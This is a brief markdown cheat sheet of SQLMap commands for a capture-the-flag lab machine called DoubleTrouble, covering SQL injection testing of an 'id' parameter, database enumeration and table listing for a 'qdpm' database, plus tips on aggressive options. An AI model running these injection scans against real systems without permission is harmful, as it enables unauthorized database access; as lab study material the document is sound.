# 🐍 SQLMap Commands

This file contains useful **SQLMap commands** for testing SQL injection vulnerabilities on the **DoubleTrouble CTF machine**.

---

## Basic Usage
Test a vulnerable parameter for SQL Injection:
```bash
sqlmap -u "http://10.0.2.4/index.php?id=1" --batch
```
### Enumerate Databases
```bash
sqlmap -u "http://10.0.2.4/index.php?id=1" --dbs
```
___
### List Tables in a Database
Example for database `qdpm`:
```bash
sqlmap -u "http://10.0.2.4/index.php?id=1" -D qdpm --tables
```
___
### Notes
- Always run with `--batch` to skip interactive prompts.
- Use `--risk` and `--level` for more aggressive testing if needed.
- SQLMap can automatically detect DBMS and adjust payloads.